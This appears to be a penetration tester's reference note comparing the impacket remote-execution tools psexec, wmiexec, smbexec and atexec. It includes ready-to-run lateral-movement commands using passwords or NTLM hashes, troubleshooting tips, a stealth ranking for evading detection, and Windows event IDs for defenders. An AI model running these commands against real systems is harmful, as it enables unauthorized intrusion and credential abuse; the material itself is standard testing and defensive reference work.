---
tags: [pentest, impacket, psexec, wmiexec, smbexec, atexec, lateral, active-directory, initial-access, windows]
phase: 5
---
# psexec / wmiexec / smbexec / atexec

The four impacket "interactive shell" tools. Same goal (RCE with creds/hash), different mechanisms.

[[06 - Gaining Access/00 - README|Folder index]]

## Quick comparison

| Tool | Mechanism | Pros | Cons |
| --- | --- | --- | --- |
| **psexec** | Drops binary in ADMIN$, creates service, runs | Always works as SYSTEM | Loud - service + file artifact |
| **wmiexec** | DCOM/WMI exec | Quietest. No service. | Sometimes flakey, output via SMB |
| **smbexec** | Service + named pipe | Semi-interactive | Older; psexec preferred |
| **atexec** | Scheduled task creation | Single command only | Task creation logged |

## Run (all share auth syntax)

```bash
# psexec
impacket-psexec   corp.local/admin:pass@<ip>
impacket-psexec   -hashes :<NTLM> corp.local/admin@<ip>

# wmiexec
impacket-wmiexec  corp.local/admin:pass@<ip>
impacket-wmiexec  corp.local/admin:pass@<ip> 'whoami /priv'     # single cmd
impacket-wmiexec  -k -no-pass corp.local/admin@host.corp.local  # Kerberos

# smbexec
impacket-smbexec  corp.local/admin:pass@<ip>

# atexec (non-interactive, runs once)
impacket-atexec   corp.local/admin:pass@<ip> 'whoami'
```

## Local SAM admin

When using a local admin account (not domain):

```bash
impacket-psexec ./admin:pass@<ip>      # the ./ prefix = local
impacket-wmiexec ./admin:pass@<ip>
nxc smb <ip> -u admin -p pass --local-auth
```

## Use a non-Administrator share

```bash
impacket-psexec ... -share C$           # default is ADMIN$
impacket-psexec ... -share IPC$
```

## Run as SYSTEM vs user

- `psexec` runs as **SYSTEM** by default (service spawns).
- `wmiexec` / `smbexec` / `atexec` run as the **authenticating user**.

To get SYSTEM via wmiexec, you'd need to chain a Potato attack from inside.

## When you see X, do Y

| Error | Cause / fix |
| --- | --- |
| `STATUS_LOGON_FAILURE` | Wrong cred |
| `STATUS_ACCESS_DENIED` | Cred right; no admin on this host. Try local-auth or a different host. |
| `WERR_BADFILE` | psexec failed to clean up old binary. Re-run usually OK. |
| `KRB5KDC_ERR_S_PRINCIPAL_UNKNOWN` | Use FQDN, not IP, with Kerberos. |
| `Cannot connect to target` | SMB blocked / host firewall. Try wmiexec (uses 135 + dynamic) or smbexec (445). |
| wmiexec output garbled | Encoding mismatch. Try `--codec utf-8` flag. |

## OpSec ranking (quietest → loudest)

```text
wmiexec  ←  quietest (no on-disk artifact on target; uses WMI events)
atexec
smbexec
psexec   ←  loudest (drops binary in ADMIN$, creates service)
```

## Detection

- psexec: Event ID 7045 (service installed) with random service name.
- wmiexec: Sysmon Event ID 1 with parent `wmiprvse.exe` running `cmd.exe`.
- All: Event ID 4624 Type 3 from non-admin source IP.

> [!tip] Try wmiexec first
> Less noise, no service install. Fall back to psexec only when WMI isn't reachable (135 firewalled).
